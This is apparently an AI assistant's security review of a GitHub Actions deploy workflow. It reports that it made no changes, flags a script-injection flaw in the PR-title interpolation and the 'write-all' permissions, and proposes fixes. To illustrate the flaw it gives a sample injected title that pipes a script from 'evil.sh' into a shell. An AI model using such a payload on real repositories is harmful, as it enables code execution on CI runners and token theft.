I didn't change anything. I can only read files in this session, with no edit or write tool, and the workflow doesn't match what the request assumes.

**What `.github/workflows/deploy.yml` actually contains:**

```yaml
on:
  pull_request:
permissions: write-all
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: echo "Title is ${{ github.event.pull_request.title }}"
```

There's no build step, no test step and no build output. So there's nothing to upload yet, and no "after the tests pass" point to put an upload step. I don't know your build command or where its output goes, so I haven't made one up.

**Two security problems in the existing file:**

1. **Script injection at `deploy.yml:14`.** The PR title is pasted straight into the shell script. Anyone who opens a PR can use a title like `"; curl evil.sh | sh; echo "` to run their own commands on the runner. Pass the title through an environment variable instead:
   ```yaml
   - env:
       PR_TITLE: ${{ github.event.pull_request.title }}
     run: echo "Title is ${PR_TITLE}"
   ```
2. **`permissions: write-all` at `deploy.yml:7`.** Combined with problem 1, that gives an attacker a token that can write to the repo. A test-and-upload job only needs `contents: read`.

**Once build and test steps exist, the job would look roughly like this:**

```yaml
permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          persist-credentials: false
      - run: <your build command>
      - run: <your test command>
      - uses: actions/upload-artifact@v4
        with:
          name: build
          path: <build output dir, e.g. dist/>
          if-no-files-found: error
```

Steps run in order and stop at the first failure, so the upload only happens after the tests pass. Ideally, pin both actions to full commit SHAs rather than `@v4`.

If you tell me your build and test commands and the output path, or let me edit files, I'll write the full workflow with both fixes included.
